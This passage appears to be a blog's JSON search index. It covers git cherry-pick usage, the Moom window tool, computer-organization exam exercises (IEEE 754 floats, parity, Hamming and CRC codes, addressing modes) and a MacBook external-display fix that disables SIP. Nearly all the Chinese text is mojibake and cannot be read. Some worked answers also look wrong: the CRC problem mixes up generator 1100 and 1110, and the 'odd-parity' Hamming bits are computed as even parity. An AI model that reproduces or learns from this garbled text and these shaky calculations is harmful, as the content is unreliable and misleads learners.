ä¸ªæäº¤ï¼‰ï¼Œè¿™æ—¶å¯ä»¥é‡‡ç”¨(git cherry-pick) ã€‚\n\n<!-- more -->\n\n# 1. cherry-pickä½¿ç”¨\n\n### 1.1 hashæ–¹å¼\n\ngit cherry-pickå‘½ä»¤çš„ä½œç”¨ï¼Œå°±æ˜¯å°†æŒ‡å®šçš„æäº¤ï¼ˆcommitï¼‰åº”ç”¨äºå…¶ä»–åˆ†æ”¯ã€‚\n\n```bash\n$ git cherry-pick <commitHash>\n```\n\nä¸Šé¢å‘½ä»¤å°±ä¼šå°†æŒ‡å®šçš„æäº¤commitHashï¼Œåº”ç”¨äºå½“å‰åˆ†æ”¯ã€‚è¿™ä¼šåœ¨å½“å‰åˆ†æ”¯äº§ç”Ÿä¸€ä¸ªæ–°çš„æäº¤ï¼Œå½“ç„¶å®ƒä»¬çš„å“ˆå¸Œå€¼ä¼šä¸ä¸€æ ·ã€‚\n\n\n\n+ Aåˆ†æ”¯log:\n\n```ini\n* cf976d8 - (HEAD -> master, origin/master, origin/HEAD) add 2 (2 minutes ago) <liuwei>\n* 07444e6 - add 1 (2 minutes ago) <liuwei>\n* 73a2b7f - (cherry) rm citycode (4 minutes ago) <liuwei>\n```\n\n+ Båˆ†æ”¯æ“ä½œ\n\n```bash\ngit cherry-pick 07444e6\n```\n\n+ ç„¶åå†çœ‹Båˆ†æ”¯log:\n\n```ini\n* d38ece4 - (HEAD -> cherry) add 1 (11 seconds ago) <liuwei>\n* 73a2b7f - rm citycode (5 minutes ago) <liuwei>\n```\n\n\n\n### 1.2 åˆ†æ”¯æ–¹å¼\n\ngit cherry-pickå‘½ä»¤çš„å‚æ•°ï¼Œä¸ä¸€å®šæ˜¯æäº¤çš„å“ˆå¸Œå€¼ï¼Œåˆ†æ”¯åä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¡¨ç¤ºè½¬ç§»è¯¥åˆ†æ”¯çš„æœ€æ–°æäº¤ã€‚\n\n```bash\n$ git cherry-pick feature\n```\n\nä¸Šé¢ä»£ç è¡¨ç¤ºå°†featureåˆ†æ”¯çš„æœ€è¿‘ä¸€æ¬¡æäº¤ï¼Œè½¬ç§»åˆ°å½“å‰åˆ†æ”¯ã€‚!!!æ³¨æ„æ˜¯ä¸€æ¬¡æäº¤(commit), ä¸æ˜¯æ‰€æœ‰çš„æäº¤ã€‚!!!\n\n\n\n### 1.3 å¤šä¸ªæäº¤\n\nCherry pick æ”¯æŒä¸€æ¬¡è½¬ç§»å¤šä¸ªæäº¤ã€‚\n\n```bash\n$ git cherry-pick <HashA> <HashB>\n```\n\nä¸Šé¢çš„å‘½ä»¤å°† A å’Œ B ä¸¤ä¸ªæäº¤åº”ç”¨åˆ°å½“å‰åˆ†æ”¯ã€‚è¿™ä¼šåœ¨å½“å‰åˆ†æ”¯ç”Ÿæˆä¸¤ä¸ªå¯¹åº”çš„æ–°æäº¤ã€‚\n\n\n\nå¦‚æœæƒ³è¦è½¬ç§»ä¸€ç³»åˆ—çš„è¿ç»­æäº¤ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ç®€ä¾¿è¯­æ³•ã€‚\n\n```bash\n$ git cherry-pick A..B \n```\n\nä¸Šé¢çš„å‘½ä»¤å¯ä»¥è½¬ç§»ä» A åˆ° B çš„æ‰€æœ‰æäº¤ã€‚å®ƒä»¬å¿…é¡»æŒ‰ç…§æ­£ç¡®çš„é¡ºåºæ”¾ç½®ï¼šæäº¤ A å¿…é¡»æ—©äºæäº¤ Bï¼Œå¦åˆ™å‘½ä»¤å°†å¤±è´¥ï¼Œä½†ä¸ä¼šæŠ¥é”™ã€‚\n\næ³¨æ„ï¼Œä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤ï¼Œæäº¤ A å°†ä¸ä¼šåŒ…å«åœ¨ Cherry pick ä¸­ã€‚\n\n\n\n# 2. ä»£ç å†²çª\n\nå¦‚æœæ“ä½œè¿‡ç¨‹ä¸­å‘ç”Ÿä»£ç å†²çªï¼ŒCherry pick ä¼šåœä¸‹æ¥ï¼Œè®©ç”¨æˆ·å†³å®šå¦‚ä½•ç»§ç»­æ“ä½œã€‚\nï¼ˆ1ï¼‰--continue\nç”¨æˆ·è§£å†³ä»£ç å†²çªåï¼Œç¬¬ä¸€æ­¥å°†ä¿®æ”¹çš„æ–‡ä»¶é‡æ–°åŠ å…¥æš‚å­˜åŒºï¼ˆgit add .ï¼‰ï¼Œç¬¬äºŒæ­¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œè®© Cherry pick è¿‡ç¨‹ç»§ç»­æ‰§è¡Œã€‚\n\n```bash\n$ git cherry-pick --continue\n```\n\nï¼ˆ2ï¼‰--abort\n\nå‘ç”Ÿä»£ç å†²çªåï¼Œæ”¾å¼ƒåˆå¹¶ï¼Œå›åˆ°æ“ä½œå‰çš„æ ·å­ã€‚\n\n```bash\n$ git cherry-pick --abort\n```\n\nï¼ˆ3ï¼‰--quit\nå‘ç”Ÿä»£ç å†²çªåï¼Œé€€å‡º Cherry pickï¼Œä½†æ˜¯ä¸å›åˆ°æ“ä½œå‰çš„æ ·å­ã€‚\n\n```bash\n$ git cherry-pick --quit\n```\n\n\n\n# 3. åœæ­¢ä½¿ç”¨cherry-pick\n\nåœ¨å¼€å‘ä¸­ï¼Œä¸è¦ä½¿ç”¨ cherry-pick æ¥è¿›è¡Œä¸åŒåˆ†æ”¯ä¹‹é—´ä»£ç çš„åŒæ­¥ï¼Œè¿™å¾ˆå¯èƒ½ä¼šé€ æˆæœ€ç»ˆåˆå¹¶æ—¶å‡ºç°å†²çªï¼Œè€Œä¸”å¯èƒ½äº§ç”Ÿæ¯”å†²çªæ›´ä¸¥é‡çš„é—®é¢˜ï¼šè¯¥æœ‰å†²çªå´æ²¡æœ‰å†²çªã€‚\n\n\n\n![1](gitçš„cherry-pickçš„ä½¿ç”¨/1.png)\n\n\n\nå¦‚ä¸Šå›¾ï¼Œ`apple` ä»£è¡¨è¿™ä¸ªåŠŸèƒ½æ˜¯ä¸Šçº¿çŠ¶æ€ï¼Œ`berry` ä»£è¡¨è¿™ä¸ªåŠŸèƒ½æ˜¯ä¸‹çº¿çŠ¶æ€ã€‚\n\nç„¶åæˆ‘ä»¬å‘ç°äº†ä¸€äº› bugï¼Œéœ€è¦å°†è¯¥åŠŸèƒ½ç´§æ€¥ä¸‹çº¿ï¼Œæˆ‘ä»¬ï¼š\n\n- åœ¨ feature åˆ†æ”¯ä¸Šä¸‹çº¿è¯¥åŠŸèƒ½ï¼ˆF2ï¼‰ï¼š`apple -> berry`\n- ç„¶åå°†è¯¥æ“ä½œ cherry-pick åˆ° masterï¼ˆM2ï¼‰ï¼Œç°åœ¨ master ä¸Šè¯¥åŠŸèƒ½ä¹Ÿä¸‹çº¿äº†\n- ç„¶åæˆ‘ä»¬åœ¨ feature åˆ†æ”¯ä¸Šè¿›è¡Œäº† bug ä¿®å¤ï¼Œæœ€ç»ˆè§£å†³äº† bugï¼Œæˆ‘ä»¬åœ¨ feature åˆ†æ”¯ä¸Šå°†è¯¥åŠŸèƒ½ä¸Šçº¿ï¼ˆF3ï¼‰ï¼š`berry -> apple`\n- ç„¶åæˆ‘ä»¬å†³å®šå°† bug ä¿®å¤ merge åˆ° master\n- merge é¡ºåˆ©å®Œæˆï¼Œæ²¡æœ‰å†²çªã€‚**ä½†æ˜¯ï¼šè¿™è¡Œä»£ç ä»ç„¶æ˜¯`berry`ï¼Œä¸‹çº¿çŠ¶æ€**\n\nmerge åˆ†æï¼šM3(`berry`) å’Œ F3(`apple`) çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯ A(`apple`)ï¼Œå› æ­¤ git è®¤ä¸º feature åˆ†æ”¯å¹¶æœªä¿®æ”¹ `apple` çš„å€¼ï¼Œç»“æœåˆå¹¶å master åˆ†æ”¯ä¸Šè¿™è¡Œä»£ç è¿˜æ˜¯ `berry`ï¼Œæˆ‘ä»¬çš„åŠŸèƒ½åœ¨ master ä¸Šè¿˜æ˜¯ä¸‹çº¿çŠ¶æ€ã€‚\n\n\n\n### 3.1 ç»éªŒ\n\nå¦‚æœä½ çš„ä¸¤ä¸ªåˆ†æ”¯æ˜¯ä¸¤ä¸ªå•ç‹¬çš„åˆ†æ”¯ï¼Œæ°¸è¿œä¸ä¼šç›¸äº’ mergeï¼Œé‚£ä¹ˆæ‰ä½¿ç”¨ cherry-pickã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n\n+ https://www.ruanyifeng.com/blog/2020/04/git-cherry-pick.html\n+ https://imliyan.com/blogs/article/%E5%81%9C%E6%AD%A2%20cherry-pick%EF%BC%8C%E5%BC%80%E5%A7%8B%20merge/\n","tags":["git"],"categories":["git"]},{"title":"moomçª—å£ç§»åŠ¨å’Œæ§åˆ¶","url":"%2Fp%2Facfaa308.html","content":"\nmacé…ç½®äº†å¤šä¸ªå¤–æ¥æ˜¾ç¤ºå™¨ï¼Œæœ‰äº›çª—å£éœ€è¦å¿«é€Ÿç§»åŠ¨åˆ°æŸä¸ªæ˜¾ç¤ºå™¨å†…ã€‚å¦å¤–å¦‚ä½•åº”å¯¹ä¸ªåˆ«ç”¨æˆ·éœ€è¦å®šåˆ¶çª—å£å°ºå¯¸åŠä½ç½®çš„éœ€æ±‚ï¼Ÿè¿™ä¸ªæ—¶å€™ä½ éœ€è¦Moomæ¥è¾…åŠ©ä½ ã€‚\n\n <!-- more -->\n\n# 1. moom\n\n### 1.1 å¯åŠ¨åœ¨menu barä¸Š\n<img src=\"moomçª—å£ç§»åŠ¨å’Œæ§åˆ¶/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n### 1.2 å”¤èµ·æ§åˆ¶\n\noption+2ï¼Œ ç„¶åcommand+ç®­å¤´å¯ä»¥å¿«é€Ÿè°ƒæ•´ã€‚\n\n<img src=\"moomçª—å£ç§»åŠ¨å’Œæ§åˆ¶/image-20220108171859040.png\" alt=\"image-20220108171859040\" style=\"zoom:50%;\" />\n\n### 1.3 ç§»åŠ¨å…¶ä»–æ˜¾ç¤ºå±\n\nè‡ªå®šä¹‰å¿«æ·é”®ï¼Œ ç§»åŠ¨åˆ°å…¶ä»–æ˜¾ç¤ºå™¨ä¸Šï¼ˆä¸Šä¸‹å·¦å³æ–¹å‘ï¼‰ ã€‚\n\n<img src=\"moomçª—å£ç§»åŠ¨å’Œæ§åˆ¶/2.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n### 1.4 ä¿å­˜å½“å‰å¸ƒå±€\n\næˆ‘ä»¬å¯ä»¥æŠŠæŸäº›ç»å¸¸ä½¿ç”¨çš„çª—å£å¸ƒå±€ç»„åˆä¿å­˜æˆ Moom æ ¼å¼çš„å¸ƒå±€å¿«ç…§ï¼Œè¿™æ ·åœ¨ä»»ä½•æ—¶å€™éƒ½å¯ä»¥ä¸€é”®è¿˜åŸåˆ°æœ€ä½³å¸ƒå±€ã€‚\n\n<img src=\"moomçª—å£ç§»åŠ¨å’Œæ§åˆ¶/3.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n \n\n# 2. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/20258341\n","tags":["moom"],"categories":["ä½¿ç”¨"]},{"title":"è®¡ç®—æœºç»„æˆåŸç†ç›¸å…³è€ƒé¢˜","url":"%2Fp%2F240de068.html","content":"\n\n\n# 1. è®¡ç®—200.11Dçš„ IEEE754å•ç²¾åº¦æµ®ç‚¹æ•°\n\n### 1.1 æ•´æ•°éƒ¨åˆ†200æ±‚äºŒè¿›åˆ¶\n\n|       | ç»“æœ | ä½™æ•° |\n| ----- | ---- | ---- |\n| 200/2 | 100  | 0    |\n| 100/2 | 50   | 0    |\n| 50/2  | 25   | 0    |\n| 25/2  | 12   | 1    |\n| 12/2  | 6    | 0    |\n| 6/2   | 3    | 0    |\n| 3/2   | 1    | 1    |\n| 1/2   | 0    | 1    |\n\näºŒè¿›åˆ¶ä¸º: 1100 1000 (å€’åº)\n\n<!-- more -->\n\n### 1.2 å°æ•°éƒ¨åˆ†0.11æ±‚äºŒè¿›åˆ¶\n\n|        | ç»“æœ | æ•´æ•°éƒ¨åˆ† |\n| ------ | ---- | -------- |\n| 0.11*2 | 0.22 | 0        |\n| 0.22*2 | 0.44 | 0        |\n| 0.44*2 | 0.88 | 0        |\n| 0.88*2 | 1.76 | 1        |\n| 0.76*2 | 1.52 | 1        |\n| 0.52*2 | 1.04 | 1        |\n| 0.04*2 | 0.08 | 0        |\n| 0.08*2 | 0.16 | 0        |\n\näºŒè¿›åˆ¶ä¸º 0001 1100(æ­£åº)\n\næ•´ä¸ªäºŒè¿›åˆ¶ä¸º: 200.11D = 11001000.00011100\n\n### 1.3 æ±‚IEEE754\n\n+ è®¡ç®—\n\n  ```bash\n  +200.11 = +11001000.00011100\n  \n  = +1.1001000 00011100 * 2^7    e=7=134-127\n  \n  S = 0(ç¬¦å·ä½)\n  E = 134D =10000110B (134çš„äºŒè¿›åˆ¶)\n  M = 1001 0000 0011 1000 0000 000 (å°æ•°ç‚¹1åé¢çš„,è¡¥é½23ä½)\n  ```\n\n+ æ‰€ä»¥äºŒè¿›åˆ¶å­˜å‚¨æ ¼å¼ä¸º\n\n  | ç¬¦å·ä½ | E(8ä½)    | M(23ä½)                      |\n  | ------ | --------- | ---------------------------- |\n  | 0      | 1000 0110 | 1001 0000 0011 1000 0000 000 |\n\n  ![1](è®¡ç®—æœºç»„æˆåŸç†æ ¡éªŒç è€ƒé¢˜/1.png)\n\n### 1.4 æ€»ç»“\n\n+ å•ç²¾åº¦æµ®ç‚¹æ•°å­—é•¿32ä½ï¼Œå°¾æ•°é•¿åº¦23ï¼ŒæŒ‡æ•°é•¿åº¦8, æŒ‡æ•°åç§»é‡127ï¼›\n\n+ https://www.binaryconvert.com/convert_float.html\n\n\n\n# 2. è®¡ç®—10001101çš„å¥‡æ ¡éªŒç å’Œå¶æ ¡éªŒç (æ ¡éªŒä½æ”¾åœ¨é¦–ä½)\n\nP=D1âŠ•D2âŠ•D3âŠ•D4âŠ•D5âŠ•D6âŠ•D7âŠ•D8\n\nP* =PâŠ•D1âŠ•D2âŠ•D3âŠ•D4âŠ•D5âŠ•D6âŠ•D7âŠ•D8\n\næ•°æ®: 10001101 \n\n+ å¥‡æ ¡éªŒç (1çš„ä¸ªæ•°ä¸ºå¥‡æ•°)\n\n  1 10001101\n\n+ å¶æ ¡éªŒç (1çš„ä¸ªæ•°ä¸ºå¶æ•°)\n\n  0 10001101\n\n\n\n# 3. è®¡ç®—æ•°æ® D=D4D3D2D1=1110çš„æµ·æ˜ç (å¥‡æ ¡éªŒ)\n\n### 3.1 è®¡ç®—\n\n2^r >= 4+1+r,   r = 3\n\næ•°æ®ä½ä¸º D4D3D2D1\n\næ ¡éªŒä½ä¸º P3P2P1\n\n| ç´¢å¼•       | 7     | 6    | 5    | 4    | 3    | 2    | 1    |\n| ---------- | ----- | ---- | ---- | ---- | ---- | ---- | ---- |\n| ä¿¡æ¯ä½     | D4    | D3   | D2   | P3   | D1   | P2   | P1   |\n| ä¿¡æ¯ä½å€¼ | 1     | 1    | 1    | P3   | 0    | P2   | P1   |\n| äºŒè¿›åˆ¶ | 111 | 110 | 101 | (100) | 011 | (010) | (001) |\n\n\nP1 = D1âŠ• D2 âŠ• D4 =  0 âŠ• 1 âŠ• 1 = 1(å¥‡æ£€éªŒ)\n\nP2 = D1âŠ• D3 âŠ• D4 = 0 âŠ• 1 âŠ• 1 = 1(å¥‡æ£€éªŒ)\n\nP3 = D2âŠ• D3 âŠ• D4 = 1 âŠ• 1 âŠ• 1 = 0(å¥‡æ£€éªŒ)\n\næ‰€ä»¥å¥‡æ ¡éªŒçš„æµ·æ˜ç ä¸º:  111 P3 0 P2 P1 =  1110 011\n\n### 3.2 æ€»ç»“\n\n+ 2^r â‰¥ k+r+1,  r æ˜¯æ ¡éªŒä½\n\n\n\n# 4. è®¡ç®—ä¿¡æ¯å¤šé¡¹å¼:101010110,ç”Ÿæˆå¤šé¡¹å¼1100çš„CRCæ ¡éªŒç \n\n1110 = 1* (x^3)  +  1 * ( x^2) +  1* (x^1) + 0 * (x^1)\n\n+ å…ˆè¡¥å……æœ€é«˜ä½æ¬¡æ•°,   101010 110 000\n+ é™¤æ•°1100\n\n| å•†:     |       |       |         | 1       | 1    | 0    | 0    | 1    | 1 | 0 | 1 | 1 | | |\n| ------- | ----- | ----- | ------- | ------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------- | ------- |\n| è¢«é™¤æ•°: | 1     | 0     | 1       | 0       | 1    | 0    | 1    | 1    | 0    | 0    | 0    | 0    | | |\n|     | **1** | **1** | **0** | **0** |      |      |      |      |      |      |      |      | | |\n|     |       | 1     | 1       | 0       | 1    |      |      |      |      |      |      |      | | |\n|     |       | **1** | **1**   | **0**   | **0** |      |      |      |      |      |      |      | | |\n|     |       |       |         |         | 1    | 0    | 1    | 1    |      |      |      |      | | |\n|     |       |       |         |         | **1** | **1** | **0** | **0** |      |      |      |      | | |\n|     |       |       |         |         |      | 1 | 1 | 1 | 0 |      |      |      | | |\n|     |       |       |         |      |   | **1** | **1** | **0** | **0** |      |      |      | | |\n|     |       |       |         |         |      |      |      | 1 | 0 | 0 | 0 |      | | |\n|     |       |       |         |         |      |      |   | **1** | **1** | **0** | **0** |      | | |\n|     |       |       |         |         |      |      |      |      | 1 | 0 | 0 | 0 | | |\n|  | | | | | | | | | **1** | **1** | **0** | **0** | | |\n|  | | | | | | | | |  | 1 | 0 | 0 | | |\n|  | | | | | | | | |  |  |  |  | | |\n\nä½™æ•°ä¸º100\n\næ‰€ä»¥CRCæ ¡éªŒç ä¸º: 101010110 100\n\n### 4.2 è®¡ç®—æ­¥éª¤\n\n1. ç”¨æœ€é«˜ä½è¡¥é½è¢«é™¤æ•°\n2. æ‹¿å‡ºé™¤æ•°, è¿›è¡Œå¼‚æˆ–è¿ç®—\n3. å•†: å¤Ÿé™¤æ˜¯1, ä¸å¤Ÿé™¤æ˜¯0\n4. å¦‚æœä½™æ•°ä¸è¶³æœ€é«˜æ¬¡æ•°,  éœ€è¦è¡¥é½0\n5. æŠŠä½™æ•°æ”¾åœ¨å¤šé¡¹å¼åé¢å³å¯\n\n\n\n# 5. å¯»å€æ–¹å¼\n\n+ æŒ‡ä»¤å¯»å€æ–¹å¼\n\n+ æ“ä½œæ•°å¯»å€æ–¹å¼\n\n  + ç«‹å³å¯»å€\n\n    æŒ‡ä»¤ä¸­ç›´æ¥ç»™å‡ºæ“ä½œæ•°ï¼ŒæŒ‡ä»¤ä¸­çš„å½¢å¼åœ°å€å­—æ®µå³ä¸ºæ“ä½œæ•°ï¼Œåˆç§°ä¸ºç«‹å³æ•°å¯»å€ã€‚\n\n  + éšå«å¯»å€\n\n    éšå«å¯»å€æ˜¯æŒ‡ä»¤å­—ä¸­ä¸æ˜ç¡®ç»™å‡ºæ“ä½œæ•°çš„åœ°å€ï¼Œå…¶æ“ä½œæ•°éšå«åœ¨æ“ä½œç æˆ–æŸä¸ªå¯„å­˜å™¨ä¸­ã€‚\n\n  + ç›´æ¥å¯»å€\n\n      æŒ‡ä»¤ä¸­åœ°å€ç å­—æ®µä¸­ç»™å‡ºçš„åœ°å€ï¼Œå³ä¸ºæ“ä½œæ•°åœ¨ä¸»å­˜ä¸­çš„åœ°å€ï¼Œæ“ä½œæ•°åœ¨ä¸»å­˜ä¸­ã€‚\n\n  + é—´æ¥å¯»å€\n\n    æŒ‡ä»¤ä¸­åœ°å€ç å­—æ®µä¸­ç»™å‡ºçš„åœ°å€ï¼Œæ˜¯æ“ä½œæ•°åœ¨ä¸»å­˜ä¸­åœ°å€çš„åœ°å€ï¼Œæ“ä½œæ•°åœ¨ä¸»å­˜ä¸­ã€‚\n\n  + å¯„å­˜å™¨ç›´æ¥å¯»å€\n\n      æŒ‡ä»¤ä¸­åœ°å€ç ç»™å‡ºçš„æ˜¯å¯„å­˜å™¨çš„ç¼–å·ï¼Œæ“ä½œæ•°åœ¨æŒ‡å®šçš„å¯„å­˜å™¨ä¸­ã€‚\n\n      ç”±äºæ“ä½œæ•°ä¸åœ¨ä¸»å­˜ä¸­,æ•…è¿™ç§å¯»å€æ–¹å¼æ— éœ€è®¿å­˜ï¼Œå‡å°‘äº†æŒ‡ä»¤æ‰§è¡Œæ—¶é—´ã€‚ç”±äºåœ°å€å­—æ®µåªéœ€æŒ‡æ˜å¯„å­˜å™¨ç¼–å·,æ•…ä½æ•°è¾ƒå°‘ï¼ŒèŠ‚çœäº†å­˜å‚¨ç©ºé—´ã€‚  å› æ­¤ï¼Œå¯„å­˜å™¨ç›´æ¥å¯»å€æ–¹å¼å¾—åˆ°å¹¿æ³›åº”ç”¨ã€‚\n\n  + å¯„å­˜å™¨é—´æ¥å¯»å€\n\n    æŒ‡ä»¤ä¸­åœ°å€ç ç»™å‡ºçš„æ˜¯å¯„å­˜å™¨çš„ç¼–å·ï¼Œè¯¥å¯„å­˜å™¨ä¸­çš„å†…å®¹ä¸ºæ“ä½œæ•°åœ°å€ï¼Œæ“ä½œæ•°åœ¨ä¸»å­˜ä¸­ã€‚\n\n     è¿™ä¹Ÿæ˜¯ä¸€ç§è®¿å†…çš„å¯»å€æ–¹å¼ï¼Œä¸å­˜å‚¨å™¨é—´æ¥å¯»å€ç›¸æ¯”è¾ƒï¼Œåªéœ€ä¸€æ¬¡è®¿å†…å³å¯è·å¾—æ“ä½œæ•°ï¼Œæé«˜äº†æ‰§è¡Œé€Ÿåº¦ï¼ŒåŒæ ·å¾—åˆ°å¹¿æ³›åº”ç”¨ã€‚\n\n  + ç›¸å¯¹å¯»å€\n\n    ç›¸å¯¹å¯»å€æ˜¯æŠŠç¨‹åºè®¡æ•°å™¨PCçš„å†…å®¹åŠ ä¸ŠæŒ‡ä»¤æ ¼å¼ä¸­çš„å½¢å¼åœ°å€D(ç›¸å¯¹é‡)è€Œå½¢æˆæ“ä½œæ•°çš„æœ‰æ•ˆåœ°å€ã€‚\n\n    ç›¸å¯¹å¯»å€çš„æœ€å¤§ç‰¹ç‚¹æ˜¯æ“ä½œæ•°åœ°å€ä¸æŒ‡ä»¤åœ°å€ä¹‹é—´æ€»æ˜¯ç›¸å·®ä¸€ä¸ªå›ºå®šå€¼ï¼Œæ“ä½œæ•°åœ°å€éšPCçš„å˜åŒ–è€Œå˜åŒ–ã€‚å› æ­¤ï¼Œæ”¯æŒç¨‹åºåœ¨ä¸»å­˜ä¸­ä»»æ„æµ®åŠ¨ã€‚\n\n  + å˜å€å¯»å€\n\n    å˜å€å¯»å€æ–¹å¼ï¼šæ˜¯æŠŠå˜å€å¯„å­˜å™¨BXçš„å†…å®¹ä¸åç§»é‡Dä¹‹å’Œä½œä¸ºæ“ä½œæ•°æœ‰æ•ˆåœ°å€ã€‚(æœ‰æ—¶é€šç”¨å¯„å­˜å™¨ä¹Ÿå¯ä½œä¸ºå˜å€å™¨ä½¿ç”¨)\n\n    å˜å€å¯„å­˜å™¨çš„å†…å®¹æ˜¯ç”±ç¨‹åºå‘˜è®¾å®šçš„ï¼Œåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­å…¶å†…å®¹å¯å˜ï¼Œè€ŒæŒ‡ä»¤å­—ä¸­çš„åç§»é‡Dæ˜¯ä¸å¯å˜çš„ã€‚ å˜å€å¯»å€ä¸»è¦ç”¨äºæ•°ç»„å¤„ç†ã€‚\n\n  + åŸºå€å¯»å€\n\n    åŸºå€å¯»å€æ–¹å¼ï¼šæ˜¯æŠŠå˜å€å¯„å­˜å™¨BRçš„å†…å®¹ä¸åç§»é‡Dä¹‹å’Œä½œä¸ºæ“ä½œæ•°æœ‰æ•ˆåœ°å€ã€‚(æœ‰æ—¶é€šç”¨å¯„å­˜å™¨ä¹Ÿå¯ä½œä¸ºå˜å€å™¨ä½¿ç”¨)\n\n    åŸºå€å¯»å€å¯ä»¥æ‰©å¤§æŒ‡ä»¤å¯¹ä¸»å­˜çš„å¯»å€èŒƒå›´ã€‚åœ¨å¤šé“ç¨‹åºå’Œæµ®åŠ¨ç¨‹åºç¼–åˆ¶æ—¶ååˆ†æœ‰ç”¨ã€‚\n\n  + æ®µå¯»å€\n\n     æ®µå¯»å€æ˜¯ä¸€ç§ä¸ºäº†æ‰©å¤§å¯»å€èŒƒå›´è€Œé‡‡ç”¨çš„æŠ€æœ¯ã€‚\n\n    å¦‚é‡‡ç”¨å°†16ä½çš„æ®µå¯„å­˜å™¨å·¦ç§»4ä½ã€åŠ ä¸Š16ä½çš„åç§»é‡å½¢æˆ20ä½çš„ç‰©ç†åœ°å€ï¼Œæ‰©å¤§äº†å¯»å€ç©ºé—´ã€‚\n    \n  + å¤åˆå¯»å€æ–¹å¼ï¼š\n\n     æ˜¯å°†ä¸¤ç§åŸºæœ¬å¯»å€æ–¹å¼ç»“åˆå½¢æˆã€‚\n\n\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://blog.csdn.net/crjmail/article/details/79723051\n+ https://zhuanlan.zhihu.com/p/26509678\n+ https://www.bilibili.com/video/BV1SJ41157pR\n+ https://www.bilibili.com/video/BV1xJ411K7Wx","tags":["æ ¡éªŒç "],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"macbookå¤–æ¥æ˜¾ç¤ºå™¨æ¨¡ç³Šé—®é¢˜","url":"%2Fp%2Fa6586325.html","content":"\n# 1. è§£å†³æ–¹æ¡ˆ\n\n### 1.0 ç¦æ­¢SIPå‰æ\n\n`command + R` è¿›å…¥macå®‰å…¨æ¨¡å¼, ç¦æ­¢SIP\n\n```bash\ncsrutil disable\n```\n\n<!-- more -->\n\n### 1.1 TV æ¨¡å¼å¼ºåˆ¶åˆ° RGB mode\n\n+ å‚è€ƒæ•™ç¨‹:\n\n  https://www.zhihu.com/question/19682094/answer/122193822\n\n  \n\n### 1.2 ä¸€é”®è„šæœ¬å¼€å¯HiDPI\n\nHiDPIæœ¬è´¨ä¸Šæ˜¯ç”¨è½¯ä»¶çš„æ–¹å¼å®ç°å•ä½é¢ç§¯å†…çš„é«˜å¯†åº¦åƒç´ ã€‚ç”¨å››ä¸ªåƒç´ ç‚¹æ¥è¡¨ç°ä¸€ä¸ªåƒç´ ï¼Œå› æ­¤èƒ½å¤Ÿæ›´åŠ æ¸…æ™°ç»†è…»ã€‚\n\n**é«˜PPI(ç¡¬ä»¶) + HiDPIæ¸²æŸ“(è½¯ä»¶) = æ›´ç»†è…»çš„æ˜¾ç¤ºæ•ˆæœ(retina)**\n\n+ é¡¹ç›®åœ°å€\n\n  https://github.com/xzhih/one-key-hidpi\n\n+ å‚è€ƒæ•™ç¨‹:\n\n  https://blog.haitianhome.com/macbook-2k-hidpi.html\n\n  é€‰æ‹©æ—¶é€‰æ‹©æœ€å¤§çš„å³å¯\n\n\n\n### 1.3 å®‰è£…RDMè½¯ä»¶\n\n+ é¡¹ç›®åœ°å€\n\n  https://github.com/avibrazil/RDM\n\n+ å‚è€ƒæ•™ç¨‹:\n\n  https://www.zhihu.com/question/19682094/answer/669420795 \n\n\n\n# 2. æ˜¾ç¤ºå™¨æ¥å£ä»‹ç»\n\nç›®å‰æ˜¾ç¤ºå™¨çš„çš„æ¥å£æœ‰DP HDMI VGA DVIè¿™å‡ ç§ï¼Œè¿™äº›æ¥å£çš„å½¢çŠ¶ä¹Ÿéƒ½ä¸åŒï¼Œæˆ‘ä»¬åœ¨é€‰è´­ä¸»æœºçš„æ—¶å€™ï¼Œä¸€èˆ¬éƒ½è¦è€ƒè™‘ä¸»æœºçš„æ˜¾å¡æ¥å£æ˜¯å¦ä¸æ˜¾ç¤ºå™¨æ¥å£ç›¸åŒ¹é…ã€‚VGAç›®å‰è¢«æ·˜æ±°æ‰äº†ï¼Œè¿™æ˜¯å› ä¸ºVGAä¼ è¾“çš„æ˜¯æ¨¡æ‹Ÿä¿¡å·ã€‚\n\nä»æ¥å£æ€§èƒ½ä¸Šæ¥çœ‹ï¼Œæ˜¾ç¤ºå™¨æ¥å£çš„æ€§èƒ½æ˜¯ DP>HDMI>DVI>VGAã€‚\n\n+ **VGAæ¥å£**\n\n  é•¿çš„å¤šé’ˆå­”\n\n  å…¶ä¸­ VGAæ˜¯æ¨¡æ‹Ÿä¿¡å·ï¼Œç›®å‰å·²ç»è¢«ä¸»æµæ·˜æ±°ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ç›®å‰èƒ½åœ¨æœ€æ–°æ˜¾å¡ä¸Šçœ‹åˆ°å…¶ä»–ä¸‰ç§æ¥å£å´çœ‹ä¸åˆ°VGAæ¥å£çš„åŸå› ï¼ŒDVIã€HDMIã€DP éƒ½æ˜¯æ•°å­—ä¿¡å·ï¼Œæ˜¯ç›®å‰çš„ä¸»æµã€‚\n\n+ **DVIæ¥å£**\n\n  DVIæ˜¯é«˜æ¸…æ¥å£ï¼Œä½†ä¸å¸¦éŸ³é¢‘ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒDVIè§†é¢‘æ¥çº¿åªä¼ è¾“ç”»é¢å›¾å½¢ä¿¡å·ï¼Œä½†ä¸ä¼ è¾“éŸ³é¢‘ä¿¡å·ã€‚ä½†æ˜¯DVIæ¥å£ä¹Ÿæœ‰ä¸å°‘å¼Šç«¯ï¼šç”±äºæœ€åˆè®¾è®¡æ—¶æ˜¯ä¸ºPCç«¯è¿›è¡Œçš„ï¼Œæ‰€ä»¥å¯¹äºç”µè§†ç­‰å…¼å®¹èƒ½åŠ›è¾ƒå·®ã€åªæ”¯æŒ8bitçš„RGBä¿¡å·ä¼ 